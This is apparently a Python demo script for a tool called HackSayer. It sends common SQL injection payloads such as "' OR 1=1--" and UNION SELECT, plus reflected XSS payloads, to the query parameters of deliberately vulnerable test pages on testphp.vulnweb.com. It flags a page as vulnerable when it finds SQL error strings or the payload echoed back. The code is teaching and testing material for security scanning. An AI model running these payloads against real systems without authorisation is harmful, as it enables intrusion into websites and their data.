#!/usr/bin/env python3
"""
Exploitation Demo for HackSayer
Demonstrates SQL Injection and XSS exploitation techniques
"""

import requests
import json
from colorama import Fore, Style

class ExploitationDemo:
    """Demonstration class for SQL Injection and XSS exploitation"""
    
    def __init__(self):
        self.results = []
    
    def exploit_sql_injection(self, target_url):
        """Demonstrate SQL injection exploitation"""
        print(f"{Fore.GREEN}[SQL Injection Demo] Testing target: {target_url}{Style.RESET_ALL}")
        
        # SQL injection payloads
        payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "admin'--",
            "' OR '1'='1"
        ]
        
        vulnerable_params = ['id', 'cat', 'email', 'user', 'pass', 'username', 'password']
        
        for param in vulnerable_params:
            for payload in payloads:
                try:
                    url = f"{target_url}?{param}={payload}"
                    response = requests.get(url, timeout=10)
                    
                    # Check for SQL injection indicators
                    sql_errors = [
                        "mysql_fetch_array",
                        "ORA-",
                        "Microsoft OLE DB Provider",
                        "SQLServer JDBC Driver",
                        "PostgreSQL query failed",
                        "Warning: mysql_",
                        "SQL syntax",
                        "mysql_num_rows()"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            result = {
                                'type': 'SQL Injection',
                                'vulnerable_parameter': param,
                                'payload': payload,
                                'url': url,
                                'evidence': error,
                                'status': 'VULNERABLE'
                            }
                            self.results.append(result)
                            print(f"{Fore.RED}[VULNERABLE] {param} = {payload}{Style.RESET_ALL}")
                            break
                            
                except Exception as e:
                    print(f"{Fore.YELLOW}[ERROR] {str(e)}{Style.RESET_ALL}")
    
    def exploit_xss(self, target_url):
        """Demonstrate XSS exploitation"""
        print(f"{Fore.GREEN}[XSS Demo] Testing target: {target_url}{Style.RESET_ALL}")
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        vulnerable_params = ['name', 'comment', 'search', 'q', 'query', 'message', 'text']
        
        for param in vulnerable_params:
            for payload in payloads:
                try:
                    url = f"{target_url}?{param}={payload}"
                    response = requests.get(url, timeout=10)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        result = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'vulnerable_parameter': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Payload reflected in response',
                            'status': 'VULNERABLE'
                        }
                        self.results.append(result)
                        print(f"{Fore.RED}[VULNERABLE] {param} = {payload}{Style.RESET_ALL}")
                        
                except Exception as e:
                    print(f"{Fore.YELLOW}[ERROR] {str(e)}{Style.RESET_ALL}")
    
    def generate_report(self):
        """Generate exploitation report"""
        report = {
            'summary': {
                'total_vulnerabilities': len(self.results),
                'sql_injection': len([r for r in self.results if r['type'] == 'SQL Injection']),
                'xss': len([r for r in self.results if r['type'] == 'Cross-Site Scripting (XSS)'])
            },
            'vulnerabilities': self.results
        }
        
        with open('exploitation_demo_results.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        return report

def main():
    """Main demonstration function"""
    demo = ExploitationDemo()
    
    # Test targets (vulnerable test sites)
    sql_targets = [
        "http://testphp.vulnweb.com/listproducts.php",
        "http://testphp.vulnweb.com/artists.php"
    ]
    
    xss_targets = [
        "http://testphp.vulnweb.com/search.php",
        "http://testphp.vulnweb.com/comment.php"
    ]
    
    print(f"{Fore.CYAN}=== HackSayer Exploitation Demo ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Testing SQL Injection vulnerabilities...{Style.RESET_ALL}")
    
    for target in sql_targets:
        demo.exploit_sql_injection(target)
    
    print(f"\n{Fore.YELLOW}Testing XSS vulnerabilities...{Style.RESET_ALL}")
    
    for target in xss_targets:
        demo.exploit_xss(target)
    
    report = demo.generate_report()
    
    print(f"\n{Fore.GREEN}=== Exploitation Results ==={Style.RESET_ALL}")
    print(f"Total vulnerabilities found: {report['summary']['total_vulnerabilities']}")
    print(f"SQL Injection: {report['summary']['sql_injection']}")
    print(f"XSS: {report['summary']['xss']}")
    print(f"Results saved to: exploitation_demo_results.json")

if __name__ == "__main__":
    main()